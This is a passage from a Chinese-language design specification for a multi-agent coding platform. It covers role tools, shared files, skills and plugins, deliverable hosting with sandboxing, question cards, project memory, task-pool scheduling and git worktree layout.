检查已通过的讨论串置为 done（merge_policy pr）或自动合并（auto），等卡片答完再继续；用户自己点的验收（`pr_state = accepting`）不受影响。原因（2026-11-19，讨论串 #29）：组长把待拍板的问题只写进设计稿就开了 PR，仓库没有 CI，按 `on_missing = pass` 几分钟后讨论串就被置为 done，而结束会取消未答的卡片。组长提示词因此要求：交付物里有待用户拍板的问题时，先用 `ask_user` 的 questions 发给用户、等回答处理完再收尾。讨论串 done / failed / archived 时平台关闭其所有员工的会话（包括 parked 的），取消它们进行中的工具调用、讨论串的待处理卡片和用量等待；取消归档不会启动任何会话。发给 parked 或已关闭会话的员工的消息会唤醒它（parked 由节点恢复进程，closed 按 SDK 会话 id resume），员工状态显示为 thinking · waking。
- **member**：`complete_task(task_id, summary, artifacts?)`（**显式完成**，见 §7.3；调用前平台先替它推送分支，见 §8.1）、`push_branch()`（把当前 worktree 的 HEAD 推到自己的成员分支，见 §8.1）、`report_progress`、`ask_lead`（阻塞）、`ask_user`（阻塞）、`send_message`、`read_messages`、`list_team`、`get_task`、`request_review`（阻塞）、`publish_deliverable`、`publish_file`、`list_deliverables`、`read_deliverable`（§6.5）、`set_status`；`can_delegate` 时加 `assign_subtask`、`wait_task`。
- **共享文件**（三层都有）：`list_shared_files(prefix?)`、`read_shared_file(path)`、`write_shared_file(file, path?)`、`delete_shared_file(path)`。项目级共享区，文件存在控制台、不进 git，项目里所有会话和用户都能存取；同名覆盖，单文件 ≤ 20 MB、项目合计 ≤ 500 MB、最多 1000 个文件；不能放凭证。取回的文件写在 cwd 下自带 `.gitignore` 的 `.shared/<path>`，结果只返回本地路径、不返回内容（员工用文件工具自己读），上传 / 下载复用 `file.chunk` / `file.download`（protocol.md §6.3～§6.5）。只读会话也有这四个工具：只读只限制改仓库，平台级写入（`publish_file`、`memory_write`）本来就有。
- **共享文件的控制台实现**（`server/internal/sharedfiles`、`toolsvc/shared.go`、`orchapi/sharedfiles.go`）：内容存 PG 的 `at_shared_files`（`data-model.md` §2.13），主键 `(project_id, path)`，同名覆盖不留版本；上限常量集中在 `sharedfiles`（`MaxFileBytes` 20 MB、`MaxProjectBytes` 500 MB、`MaxProjectFiles` 1000，覆盖按差值算），路径统一由 `sharedfiles.CleanPath` 再校验（不信任节点和浏览器）。`write_shared_file` 复用 `file.chunk` 分段（`artifacts.LoadChunks`，未认领分段的会话上限因此提到 40 MB = 两次 20 MB 上传），按声明的大小和 sha256 校验后写入；上传者记为会话员工名和它所在讨论串（列表显示“dev-1 #31”，统筹不带讨论串号）。`read_shared_file` 只把文件用 `file.download` 下发到会话所在节点的 `<cwd>/.shared/<path>`，`tool.result` 带 `shared_download`，结构化结果只有 `{path, size, sha256, local_path}`，**绝不返回文件内容**，模型之后自己用文件工具读本地文件；统筹也有工作目录（`<root>/coordinator`），同样能收。只有 hello 带 `shared_files` 特性的守护进程才会收到下发，否则工具失败并提示升级；会话不在节点上时同样失败，不退化成返回内容。写入和删除（工具或网页）都发 `shared_file` 项目事件（`api.md` §1.1），网页据此刷新；用户在网页上传的记为 `user`（`api.md` §3.5.1）。
- 审批不再是 MCP 工具（v1 的 `approve`），改走 canUseTool / Codex requestApproval（§8）。
- Claude 自带工具：每一层都有 `TodoWrite`、`AskUserQuestion`（统筹的 `deny_non_platform_tools` 对这两个放行，`ToolsAllowed` 也放行），组长的 `allowedTools` 带上它们（`dontAsk`）；写代码的成员另有 `EnterPlanMode`、`ExitPlanMode`。用法见 §6.6。

### 6.4 消息怎么推给员工

所有“给员工的话”都变成 `session.send`：用户插话、统筹 → 组长（`message_thread`）、派活、员工间留言（收件人在忙时作为 `priority:'later'` 排队，空闲时立即开回合）、`[Answer to q5]`、`[Thread #12 · review]`、CI 失败通知，以及**小任务完成通知**：成员 `complete_task` 后给组长发 `[Task t7 · dev-1 · done] <summary>`（`priority:'later'`；失败为 `· failed`），组长据此审查并 `enqueue_merge`（对应 v1 的 `[Task t1 · dev · done]\n<output>`）。若审查关卡开着且有审查岗，任务先进 `review` 由审查岗领取，通知改为在审查通过（或驳回）后发给组长，内容带审查结论。

- Claude：守护进程维护一个异步队列作为 `query()` 的 `prompt`；`priority` 原样带上（`now` 会打断当前回合，只用于用户点“插话并打断”和中止类指令）。
- Codex：空闲时 `turn/start`；回合进行中用 `turn/steer {expectedTurnId}`；`later` 由守护进程排队到 `turn/completed` 后再发。
- 消息在控制台有 `msg_id`（落库于 `at_messages`），守护进程按 `msg_id` 去重，投递后回 `session.delivered`。Claude 的 `SDKUserMessage.uuid` 就用 `msg_id`，守护进程重启后（本机去重表可能缺最后几条）在 resume 时扫描转录里已有的 user 消息 uuid，已投递的不再推（协议 §2.2）。

### 6.5 技能、插件与设计交付（skills + plugins + `publish_file`）

模型本身就能设计：用普通工具写单文件 HTML 原型、Markdown 文档、SVG。平台只提供两样东西，再把结果记下来、展示出来：

- **技能（skills）**：内置技能随控制台发布（`server/internal/skills/builtin/<name>/SKILL.md`：`design` = HTML 原型与设计稿，`docs` = Markdown 文档与规格说明），用户还可以上传自己的技能（`at_skills.user_id` = 本人，只有本人能看到和勾选），管理员可以发布所有用户都能勾选的内置技能（`user_id` 为空，`POST /api/admin/skills`；用户自己早先上传的同名技能优先，用户新上传不能占用内置名）（zip 或文件夹，只收 UTF-8 文本，单个技能 ≤ 64 个文件、≤ 512 KB，`SKILL.md` 的 front matter 必须有 `name` 和 `description`，不能和内置技能重名；zip 解压时按实际解出的字节和文件数计数，超限立即停止，压缩炸弹不会被整个读进内存）。岗位模板的 `at_roles.skills` 勾选技能（统筹不能有技能）；Team 页的预设“设计师”（`roles.Presets`）默认带 `design` + `docs`。
  - 打开会话时控制台把技能内容放进 `session.open.skills`（每岗位最多 16 个、合计 ≤ 2 MiB），并给 Claude 会话的 `tools`/`allowed_tools` 加上 `Skill`。
  - Claude：守护进程把技能写成一个本地插件 `<root>/agent-skills/<project>/<thread_no>/<employee>/`（`.claude-plugin/plugin.json` + `skills/<name>/…`，每次打开重建），**不在任何 worktree 里**，所以不会被提交；SDK 选项 `plugins: [{type:'local', path, skipMcpDiscovery:true}]` + `skills: ['agent-teams-skills:<name>', …]`（只列本岗位的技能，SDK 自带的技能不出现）。`settingSources` 仍是 `[]`。已在 SDK 0.3.325 上实测（`node/scripts/smoke-skills.ts`：模型列出的技能恰好是岗位的两个，并用 Skill 工具读到了内容）。只读岗位的文件工具可以读这个目录。守护进程写文件时去掉每个 Markdown 文件 front matter 里的 `allowed-tools`（SDK 0.3.325 实测：技能带 `allowed-tools: Bash(mkdir:*)` 时 Bash 不经 canUseTool 直接执行；去掉后照常审批），所以技能不能替岗位预批准工具。
  - Codex 没有技能加载，控制台把每个技能的 `SKILL.md`（及其余文件）追加到 `developer_instructions`。
- **插件（plugins）**：Claude Code 插件包（`.claude-plugin/plugin.json` + `skills/<name>/SKILL.md`、`commands/<name>.md`、`agents/<name>.md`、`hooks/hooks.json` 或清单里的 `hooks`、`.mcp.json` 或清单里的 `mcpServers`），见 `server/internal/plugins`。
  - **归属**：用户上传的插件（`at_plugins.user_id` = 本人）只有本人能看到、勾选，也只会在本人的节点上运行（会话总按项目所有者的岗位和节点打开）；管理员上传的是平台内置插件（`user_id` 为空，`/api/admin/plugins`），所有用户都能勾选，停用后用户看不到也不再加载（已经勾选它的岗位仍能保存，只是不加载）。用户新上传的插件不能和内置插件同名；用户已有的同名插件对他本人优先。`agent-teams-skills` 是保留名。
  - **上传**：只收 zip（≤ 2 MB），最多 200 个文件、单个 ≤ 512 KB、合计 ≤ 1 MB（按实际解压出的字节计数，超限立即停止）；拒绝符号链接、非普通文件、绝对路径、`.`/`..` 段、反斜杠，以及同一路径既是文件又是目录（如 `mcp` 和 `mcp/server.mjs`，否则守护进程每次打开会话都写不出来）；跳过 `__MACOSX`、`.git`、`.DS_Store`；外面套的一层目录会去掉。非 UTF-8 文件按 base64 保存，保留可执行位。清单需要合法的 `name`（小写、数字、`-`），可选 `version`/`description`；暂不支持清单里的 `commands`/`agents`/`skills`/`outputStyles`/`lspServers` 自定义路径。MCP 服务器只收 stdio（`command`）和 http/sse（`url`），每个插件最多 8 个。至少要有技能、命令、子代理、hooks 或 MCP 服务器之一。
  - **版本**：同一归属下同名再次上传就是新版本（`at_plugin_versions.version` 1、2、…，一条语句里自增，并发上传不会撞号）；保留最近 20 个版本，被岗位钉住的旧版本不清理。可以停用（岗位上的勾选保留，但不加载）和删除（所有版本，并从岗位上去掉）。
  - **岗位**：`at_roles.plugins` 每项是 `name`（跟随最新版本）或 `name@3`（钉住版本），每岗位最多 8 个，统筹不能有插件；保存时校验名字和版本存在。
  - **打开会话**：控制台按岗位解析出确切版本，放进 `session.open.plugins`（`PluginBundle{name, version, files, skills, agents, mcp_servers}`；技能 + 插件合起来让 `session.open` ≤ 3 MiB，超出的插件跳过）。有技能/命令时给 `tools`/`allowed_tools` 加 `Skill`，有子代理时给 `tools` 加 `Agent`（不进 `allowed_tools`）。
  - **Claude**：守护进程把每个插件写到 `<root>/agent-plugins/<project>/<thread_no>/<employee>/<name>@<version>/`（每次打开整目录重建，不在任何 worktree 里；统筹即使收到也忽略），和技能插件一起放进 `options.plugins`，都带 `skipMcpDiscovery: true`；`options.skills` = 技能插件的技能 + 每个插件的 `<plugin>:<skill>` 和 `<plugin>:<command>`（SDK 0.3.325 上插件命令也通过 Skill 工具调用，不在 `skills` 里会被拒绝；只要有插件就总是传 `skills`，用户级技能不会出现）。`strictMcpConfig` 保持开启——它会让 CLI 忽略插件自己的 `.mcp.json`，所以由守护进程把插件的 MCP 服务器（`${CLAUDE_PLUGIN_ROOT}` 换成插件目录）以 `plugin_<plugin>_<server>` 为名放进 `options.mcpServers`。插件的 MCP 工具不预批准，照常走 `canUseTool` 审批（只对 `ask` 岗位；`bypass` 岗位直接执行；只读岗位是 `dontAsk`，插件 MCP 工具和子代理会被拒绝）。CLI 启动插件子代理时不询问，但子代理里的每次工具调用照常走 `canUseTool` 和 PreToolUse 钩子；插件 hooks 由 CLI 直接在节点上运行命令，不经过审批（网页上有说明）；PreToolUse 钩子返回 allow 也能让工具跳过 canUseTool，这和“hooks 本身就是不经审批的代码”同属一类风险，平台不拦，只在说明里写明。插件技能和命令的 `allowed-tools` 会被守护进程去掉（同技能），插件里的工具不会因此被预批准。已在 SDK 0.3.325 上用一次真实调用验证（`node/scripts/smoke-plugins.ts`，夹具 `node/scripts/fixtures/tinyplug`：技能、命令、子代理、UserPromptSubmit hook 和 stdio MCP 服务器都生效，MCP 调用经过了 canUseTool）。只读岗位的文件工具可以读插件目录。
  - **Codex**：控制台把插件里 `skills/*/SKILL.md` 和 `commands/*.md` 的文字追加到 `developer_instructions`，只把带 MCP 服务器的插件发下去；守护进程照样写出插件目录，把 stdio（`command/args/env`）和 http（`url/http_headers`）服务器并进 thread 配置的 `mcp_servers`（Codex 没有 SSE，跳过）。子代理和 hooks 只在 Claude 下生效，Team 页给 Codex 岗位标了说明。
- **`publish_file(path, kind, title, deliverable_id?)`**（组长、成员）：守护进程在本机读文件——路径解析符号链接后必须在员工 cwd 内；一个文件，或带 `index.html` 的目录（小网站：跳过隐藏文件、`node_modules`、符号链接，最多 64 个文件）；只读普通文件（以 `O_NOFOLLOW | O_NONBLOCK` 打开后再 fstat，校验后换成的符号链接、FIFO、设备都拒绝），边读边计数，合计 ≤ 5 MB；扩展名限于 html、md、svg、png、jpg、gif、webp、pdf、json、csv、txt（网站里还可以有 css、js、字体）。内容按 1 MiB 切成 `file.chunk` 帧（可靠、按序）先发，再发带 `upload {upload_id, chunks, files[{path,size,sha256}]}` 的 `tool.call`（protocol.md §6.3）。控制台拼回、逐个校验大小和 sha256、按扩展名定 Content-Type（不信守护进程给的），存进 `at_deliverable_files`；不带 `deliverable_id` 时新建交付物（`detail.hosted = true`、`version`、`entry`、`render`），带了就成为该交付物的下一版。
  截图和图片不是交付物：入口文件是单张 PNG/JPEG/GIF/WebP 时不建交付物，而是存成项目附件（`at_attachments`，`user_id` = 项目所有者），在发布者的对话里写一张 `kind = image` 的消息卡（`meta.attachments`），工具结果说明附件 id 和 `/api/attachments/<id>`，提示要放进报告就把图片和 `index.html` 放在同一目录发布成网站，或直接内联进 HTML（SVG 直接写进 HTML），附件只在文字汇报里引用（Markdown 不渲染原始 HTML、过滤 `data:`，交付物在沙箱源里也取不到 `/api/attachments`）；带 `deliverable_id` 的图片拒绝，单个 SVG 拒绝；扩展名是图片但内容不是 PNG/JPEG/GIF/WebP 的也拒绝；带 `index.html` 的目录里的图片照常是网站的资源。上传分段在两条路径上都会删掉。`list_deliverables` 不列出以前发布的托管图片交付物（`render = image`，数据保留）。
- **托管与展示**：文件只通过短时签名 URL 访问（`/files/<deliverable>.<version>.<expires>.<hmac>/<path>`，2 小时，HMAC 密钥由 `AGENT_TEAMS_SECRET_KEY` 派生），不需要也不读会话 cookie。配置了 `AGENT_TEAMS_ARTIFACT_ORIGIN`（必须是与 `AGENT_TEAMS_PUBLIC_URL` 不同的主机，最好是另一个注册域）时 URL 指向那个源，主站上的 `/files/` 返回 404，那个源上除 `/files/` 以外的路径（网页、登录、API）也一律 404，页面在自己的源里找不到任何控制台功能；未配置时由控制台的 `/files/` 提供。响应总是带 `Content-Security-Policy: sandbox allow-scripts allow-forms allow-popups allow-modals allow-downloads`（**没有独立源时不含 `allow-same-origin`**，页面跑在不透明源里，拿不到 cookie，也不能以控制台身份调接口）、只放行设计技能列出的 CDN 的 `default-src`/`script-src`、`frame-ancestors` 限定为网页本身、`X-Content-Type-Options: nosniff`、`Referrer-Policy: no-referrer`。网页的交付物查看器：HTML 放在 `sandbox` iframe 里（同样只有独立源时才加 `allow-same-origin`），Markdown 用 react-markdown 渲染（不渲染原始 HTML，相对链接只解析到同一版本目录里），图片内联，其他类型列出文件；可以切换版本。
- **取回与改稿**（任何员工都能改任何讨论串发布的稿）：`list_deliverables(thread?, kind?)`（统筹、组长、成员）列出本项目的交付物（id、标题、类型、版本数、最新版本和发布者、讨论串、更新时间，最多 50 条）；`read_deliverable(deliverable_id, version?)`（组长、成员，只限本项目的托管交付物，按项目所有者和项目双重限定）把那一版的文件送到员工 cwd 下的 `.agent-deliverables/<id>/v<N>/`：控制台按 1 MiB 切成可靠的 `file.download` 帧（`publish_file` 的反方向，protocol.md §6.4），排在带 `download {download_id, deliverable_id, version, chunks, files[{path,size,sha256}]}` 的 `tool.result` 前面；守护进程只为正在等的那次调用收分段，写盘前重新校验 id、版本、每个文件名（同发布时的规则：相对路径、不以点开头、白名单扩展名，`..`、绝对路径一律拒绝）、分段数、合计 ≤ 5 MB 和每个 sha256，目录必须是真目录（符号链接拒绝），版本目录整体替换，文件以 `O_EXCL | O_NOFOLLOW` 创建；顶层目录里写一个内容为 `*` 的 `.gitignore`，所以这些文件永远不会被提交（`publish_file` 发布目录时本来就跳过点开头的目录）。工具结果给出本地目录（守护进程补上绝对路径）、文件列表、版本历史（每版谁发布、哪个讨论串、何时）和用户的批注。改稿就是在那里改，再 `publish_file(path=…, deliverable_id=同一个 id)`：成为下一版，`at_deliverable_files.published_by / publisher_id` 记下这一版的发布者（00180），查看器的版本切换显示“v3 · dev-2 修改”。守护进程不支持（hello 没有 `file_download` 特性）时工具失败并提示升级。
- **批注**：`POST /api/deliverables/{id}/comments` 存进 `at_deliverable_comments`，并作为消息投递给**被批注那一版（没指定就是最新版）的发布者**（按员工 id，同名的其他讨论串员工不会收到）；发布者已不在（员工停用）就给他所在讨论串的组长，消息里说明原发布者已不在；旧版本没有员工 id 时按名字找交付物所在讨论串的员工，再不行给那个讨论串的组长。消息里带上 `deliverable_id` 和改稿方法（`read_deliverable` 取回 → 原处修改 → `publish_file` 带同一个 id）。
- **@ 引用交付物**：托管交付物的引用附上最新一版的文件列表；入口文件是文本类（html、md、svg、json、csv、txt、css、js）时把内容直接接在消息里（最多 30000 字节，截断时注明），图片和 PDF 只说明类型；都附上 `read_deliverable(deliverable_id=…)` 的提示，用于取回完整内容或多文件网站后修改。

### 6.6 对话里能看到的工具（问题卡片、待办、计划、交付物）

线程面板和统筹对话是纯聊天，工具调用默认不显示；只有下面这些画成卡片，插在发生的位置：

- **提问卡片**：`ask_user` 除了 `question` + `options`，还收 `questions`（1–4 个，每个 `{question, header, options: [{label, description?, recommended?}] (2–4 个), multi_select?}`，和 Claude Code 的 AskUserQuestion 一样）。控制台把它们存进 `at_questions.detail.questions`，`text` 是各问题连起来，只有一个问题时 `options` 是选项标签（老页面照样能答）。网页卡片：问题在上，选项一行一个（字母徽标 A/B/C、标签、“推荐”标签、说明），最后一行是“其他（自己写）”；单个单选问题点一下就提交，否则选完点“提交”。回答走 `POST …/answer {answers: [{selected[], other?}]}`（按问题顺序；单选最多一项，选项必须是卡片上的，至少选一项或写其他，否则 422），控制台把每题的选择存进 `detail.answers`，`answer` 是可读文本（多题时 `header：选择`）；阻塞调用的结果是 `{question_id, answer, answers[]}`，不阻塞的照旧收到 `[Answer to qN] 文本`。纯文字回答结构化卡片时，算作每题的“其他”。答过的卡片留在对话里，收起成问题 + 选中的那几行（带对勾）；审批卡片只在待处理时显示。
- **Claude 的 AskUserQuestion**：SDK 0.3.325 实测，`bypassPermissions` 下 canUseTool 依然会收到它（`requiresUserInteraction`），而守护进程原来直接放行，结果是 “The user did not answer the questions.”。现在守护进程给它单独挂一个 PreToolUse 钩子（`matcher: AskUserQuestion`，超时 7 天）：把输入转成 `ask_user {questions, via: "AskUserQuestion"}`（`via` 让所有层级都阻塞），等平台卡片的答案，再以 `permissionDecision: "allow"` + `updatedInput.answers = {问题: "标签, 标签"}` 交回 CLI，CLI 生成的工具结果就是用户的答案（bypass、dontAsk、default 三种模式实测都这样）。调用失败时钩子拒绝这次调用，理由带上原因。
- **待办清单**：PreToolUse 看到 `TodoWrite` 时发 `session.event {kind: todos, todos[]}`。控制台只保留统筹和组长的（成员的太吵）：对话里每人一张 `kind = todos` 的消息卡，最新一张没全部完成就原地更新（`UPDATE at_messages`，同 id 的 `message` 事件，网页按 id 替换），全部完成后再来的清单开新卡。网页画成清单：完成的划掉，进行中的用转圈和 `activeForm`。
- **计划**：`ExitPlanMode` 的计划在 SDK 0.3.325 里不在工具输入里，而是 CLI 写在配置目录 `plans/` 下的文件；守护进程在 PostToolUse 取 `tool_response.plan`，没有就读 `tool_response.filePath`（必须在 Claude 配置目录里），发 `session.event {kind: plan, plan}`，控制台存成 `kind = plan` 的消息卡（Markdown，长的折叠）。`ask` 岗位的 `ExitPlanMode` 走审批，卡片显示成“计划等你批准”（批准计划 / 提修改意见）。
- **交付物**：`publish_file`、`publish_deliverable` 成功后在发布者的对话里加一张 `kind = artifact` 的消息卡（`meta.deliverable = {id, kind, title, url, hosted, entry, render, version}`），网页显示类型图标、标题、版本；托管文件打开查看器 `/projects/:pid/deliverables/:id`，链接类直接打开链接。
- **截图**：`publish_file` 发的单张图片加一张 `kind = image` 的消息卡（`content` =「dev-1 上传了截图：标题」，`meta = {employee, title, attachments: [{id, name, content_type, size}]}`），网页显示图片。
- **PR**：讨论串进入 `review` 时对话底部是原来的验收卡片（验收通过并合并 / 提修改意见 / 在 GitHub 上看）。
- **会话已恢复**：§6.2 的 `kind = resumed` 消息。

这些消息都是 `role = system`、`author = 员工名`、`meta.employee`；恢复摘要只取 `chat/note/interrupt` 类消息，卡片不会混进去。

### 6.7 项目指令与自动记忆

仿照 Claude Code 的 CLAUDE.md 和 auto memory，项目有两种跨会话的上下文，都在 项目设置 → 记忆 里看和改：

- **项目指令**：用户写的指令和规则（最多 16,000 字），存在 `at_projects.context`（API 字段名仍是 `context`，原来的“项目上下文 / 您想做些什么”就是它，数据不用迁移；通用分区不再显示它）。每个会话的 `systemPrompt.append` 都带 `## 项目指令（用户编写…必须遵守）`；各仓库的基准分支也写在这里（§8.1）。
- **自动记忆**：员工自己记的笔记，按文件存在 `at_memory_files (project_id, name, description, content, updated_by, …)`。`MEMORY.md` 是索引：每个会话开始时注入（前 200 行、最多 12 KB，超出的部分提示用 `memory_read("MEMORY.md")` 读全文并精简），MEMORY.md 没链接到的文件另列 `其他记忆文件：name — description`。主题文件（`testing.md` 之类，名字可以是中文，`.md` 自动补上，最多 200 个，每个最多 32,000 字）按需用 `memory_read` 读。
  - 工具：`memory_list`、`memory_read(name)`（统筹、组长、成员）；`memory_write(name, description?, content)`、`memory_delete(name)`（统筹、组长）。写主题文件必须带一句描述，平台在 MEMORY.md 里维护它的 `- [name](name) — description` 一行（改写时替换、删除时去掉）；`name = MEMORY.md` 直接改写索引本身，MEMORY.md 不能删。`remember(text)` 是往 MEMORY.md 末尾追加 `- text` 的快捷方式。`updated_by` 记写入者（`coordinator`、`lead-1 · #3`、`user`、`platform`）。被拒的写入（名字、长度、数量、缺描述）以 `isError` 结果回给模型。
  - 提示词里的使用说明：记用户偏好、决定和理由、项目约定（构建、测试、发布、分支）、踩过的坑、外部系统；不记任务进度、临时状态、看代码就知道的事和秘密；改之前先读，过时的改正或删除。成员被告知只读，值得记的写进 `complete_task` 总结由组长整理。
  - 组长 `finish(summary)` 的总结进 `thread-summaries.md`（§6.3）。
  - 网页：MEMORY.md 一行（作用范围、更新时间），记忆文件列表；点开是 Markdown 查看，可编辑、删除、新建（`PUT/DELETE /api/projects/{pid}/memory/{name}`），保存后新开的会话读到。项目首页的“项目记忆”框列出 MEMORY.md 和前几个文件。
  - 迁移 `00140_memory_files.sql`：`at_project_memory` 的用户 / 统筹笔记变成 MEMORY.md 的要点（置顶在前），`#<no>` / `thread:<no>` 来源的讨论串总结变成 `thread-summaries.md` 的各节；旧表删除（Down 把每个文件还原成一条笔记，MEMORY.md 置顶）。

## 7. 讨论串、调度与任务池

### 7.1 讨论串生命周期

```
queued ──开工──► running ◄──► waiting（有等你处理的卡片 / 组长在等用户）
   │               │
   │               ├──► review（open_pr 后） ──accept / 自动合并（§8.4）──► done ──► archived
   │               │                 └──reject / CI 失败──► running
   │               ├──► paused（用户暂停：中断所有回合，会话 park，任务池停止派发）
   └───────────────┴──► failed（组长报告失败或不可恢复错误）
```

开工（`queued → running`）由 orchestrator 做。同一用户（跨项目）同时处于 `running` 或 `waiting` 的讨论串数（Admin 页“每人最多同时运行的讨论串”）可用 `max_running_threads` 限制（全局在 `at_settings.platform.max_running_threads`，默认 0 = 不限；`at_users.max_running_threads` 可单独覆盖，NULL = 用全局，0 = 不限），设了上限时超出的新串停在 `queued`，有串结束或暂停时按创建顺序开工；Thread 页对排队的串显示“排队中（前面还有 n 个）”。

1. 分配编号与分支名 `thread/<no>-<slug>`；GitHub API 从基准分支建 ref（已存在跳过）。
2. 按岗位模板实例化员工 `<role>-<n>`（写 `at_employees`），节点在岗位 `nodes` 里按“当前活跃会话最少”挑，不再是纯轮转。
3. 给组长发 `git.prepare`（worktree）+ `session.open`，第一条消息 = 统筹的 brief。
4. 成员**懒启动**：任务池里有该岗位可领的任务时才开会话（省进程、省额度）。

讨论串的“等你处理”数 = open 的 user 提问 + 待审批卡片 + （review 状态时）验收。

### 7.2 两级任务

- **主任务**（`at_main_tasks`）= 组长 `update_plan` 的步骤，带稳定 id；小任务通过 `main_task_id` 挂在下面。组长改计划时按标题匹配保留 id。
- **小任务**（`at_tasks`）状态：`pending`（池中待领）→ `claimed` → `running` → `review`（等审查岗）→ `decision`（等决策岗，可选）→ `merging`（在合并队列里）→ `done`；以及 `failed`、`cancelled`、`blocked`（依赖未满足）。关卡开关在项目设置（交付流程）里，关掉的关卡直接跳过。
- 主任务下全部小任务 `done` → 主任务自动 `done`（组长也可手动改）。

### 7.3 任务池调度

任务进**项目级任务队列**，由项目的空闲成员领取（细节见 [shared-members.md](shared-members.md) §4）：

- 触发：任务新建 / 状态变化、成员回合结束且手里没任务、节点上线（节点主人有待领任务的项目）、定时（每 10 s 兜底）。触发写 Valkey 频道 `sched:<project>`，调度循环（advisory lock 选主）按项目消费。
- 领取：可领取 = `pending`、依赖都 `done`（`ready_at` 非空）、讨论串 `running` / `waiting`、岗位匹配；空闲 = 全项目没有 claimed / running 任务。每一轮取空闲成员和最多 200 个可领取任务，纯函数 `pick`（`scheduler/score.go`）按档位挑最好的一对：点名 > 返工预留（审查打回、CI / 冲突修复留给原成员 10 分钟）> 饿死（可领取超过 5 分钟）> 依赖粘性 > 讨论串粘性 > 同仓库 > 其他；锁住成员和任务再核对一次后改成 `claimed`。
- 领取后发事件 `task.claimed`（办公室里那人“走到任务板 → 领取 → 回工位”就由它驱动），再给该成员 `session.send`（必要时先 `git.prepare` + `session.open`）。消息正文 = 任务说明 + 依赖任务的交接内容 + 工作目录同步结果 + 简报（名单、未读留言）。
- **开工前同步**（shared-members.md §4.2）：员工已有节点、节点支持 `git_sync` 时，领取后先按仓库发 `git.prepare {sync}`（普通任务 `member` 模式同步到讨论串分支；审查 / 决策任务 `review` 模式检出被审的成员分支），任务停在 `claimed`（`sync_pending`），结果都回来才发任务简报；2 分钟没回来照发，并注明没同步。
- **交接内容**：每个依赖任务给出做的人、总结（≤ 3000 字）、`complete_task` 的 `handoff`（有下游依赖时第一次不写会被提醒一次）、合并进讨论串分支的范围和改动文件（`at_merge_queue.base_sha` 到合并后的 sha，GitHub compare 取文件，记在 `at_tasks.merged`）和审查 / 决策结论。
- **自动推送**：成员回合结束时手里的任务还在 running，平台把已提交的工作推到成员分支（每人 5 分钟最多一次，没有新提交节点不推），节点掉线也丢不了已提交的工作。
- **完成判定**：成员调用 `complete_task` 才算完成；完成后按 §6.4 通知组长。若回合结束（`result`）而任务仍 running，平台推一条提醒“如果做完了请调用 complete_task；没做完请继续”；连续 2 次回合结束仍未完成 → 任务标 `blocked`，给组长发 `[Task t7 · dev-1 · 需要关注]`。这比 v1 “用最后一条 result 当输出”可靠，因为常驻会话里一个回合不等于一个任务。
- 一个成员全项目同一时间只有一个 claimed / running 任务；`can_delegate` 的子任务也进同一个队列。领到别的讨论串的任务时先关掉旧会话（`switch_thread`），在新讨论串开会话。
- **会话管理**（shared-members.md §5）：同一讨论串里领下一个任务时，按岗位的 `clear_after_tasks`（会话已收到的任务简报数 `tasks_done`）和 `compact_between_pct`（上次回合结束的 `context_used` 对 `context_limit` 的比例）决定继续、先压缩（`session.compact`，任务停在 `claimed`，`session.compacted` 或 10 分钟后再同步、发简报）还是 clear（`context_clear` 关会话，简报开新会话并带讨论串摘要）；节点没有 `session_compact` 时该压缩的改为 clear；会话正在跑回合时不动它。任务简报带“任务锚点”（`session.send.anchor`），任务中运行时自己压缩后守护进程把它补回去；同一任务任务中压缩 ≥ 2 次给组长发一次“考虑拆小”。
- 讨论串结束：关掉在这个讨论串开着的会话（组长和在这里干活的成员），清空成员的 `current_thread_id`，按“在这里干过活的成员”删成员分支、清 checkout；成员本身不受影响。
- 失败重试：`complete_task` 报失败或会话崩溃时任务回池（`attempt+1`，上限 2），超限 `failed` 并通知组长。
- 依赖断了：任务 `failed` 或 `cancelled` 时，依赖它的 `pending` 任务（以及再依赖它们的）都标为 `blocked` 并给组长发一条 `[Task t3 · 失败了] 依赖它的 t5、t6 已标为 blocked…`：依赖必须 `done` 才能开工，这些任务永远等不到，不能悄悄留在池里。组长 `cancel_task` 后重新拆，或由用户在任务页重试。同理，`assign_task` 的 `depends_on` 里有 `failed` / `cancelled` 的任务时直接拒绝（错误写明依赖和状态），重试一个依赖仍是 `failed` / `cancelled` 的 blocked 任务也拒绝（409 `dependency_ended`，先重试那个依赖）。

## 8. 分支、worktree、合并队列、CI、PR

### 8.1 目录和分支

项目可以绑定多个仓库（`at_project_repos`，有顺序）。项目不存基准分支：用户把“仓库 X 的基准分支：develop”这类约定写在项目指令里（§6.7），它会注入每个员工的提示词；统筹和组长读到后在工具参数里显式传 `base`，没写的仓库用默认分支（GitHub `default_branch`）。

```
<root>/projects/<pid>/repos/<owner>__<repo>                    每个仓库一份共享克隆（只用来 fetch 和挂 worktree）
<root>/projects/<pid>/coordinator                              空目录（统筹不检出任何仓库）
<root>/projects/<pid>/threads/<no>/lead/<owner>__<repo>        每个仓库一个 worktree，分支 thread/<no>-<slug>（只读用）
<root>/projects/<pid>/threads/<no>/<name>/<owner>__<repo>      每个仓库一个 worktree，分支 thread/<no>/<name>
```

- 会话的 cwd 是员工目录（`threads/<no>/<name>`），里面每个仓库一个子目录；提示词的“## 仓库”一节列出每个仓库的目录和本讨论串在该仓库的基准分支。多仓库之前开始的讨论串，worktree 直接在员工目录里（共享克隆在 `projects/<pid>/repo`）：项目仍只有一个仓库时继续沿用这个旧位置。
- **讨论串分支按仓库懒创建**：开串时不建分支；某个仓库第一次有条目进合并队列时，平台才在该仓库从“本讨论串在该仓库的基准分支”建 `thread/<no>-<slug>`（`at_thread_repos.branch_created`）。基准分支 = 组长/统筹显式给的（`open_thread(repos=[{repo, base}])`、`assign_task(repo, base)`、`enqueue_merge(repo, base)`，记在 `at_thread_repos.base_branch`，分支建好后就固定），否则该仓库的默认分支。成员 worktree 从讨论串分支（已存在时）或该基准分支切出。
- `git.prepare {mode: worktree|clone, repo, shared, cwd, branch, base}`：每个仓库一个作业，`session.open.prepare_jobs` 列出全部（`prepare` 为第一个，兼容旧守护进程），守护进程等它们全部成功再开会话。没有共享克隆就 clone；`git -C shared fetch origin --prune`；目标不是 worktree 就 `git -C shared worktree add -B <branch> <cwd> origin/<branch 已存在时> | origin/<base>`。clone 模式沿用 v1（每个仓库一份克隆）。
- 每台节点上每个仓库一份共享克隆；同一节点上的 fetch / worktree 操作按共享克隆加文件锁（`.<dir>.agent-teams.lock`），避免并发 `worktree add` 打架。
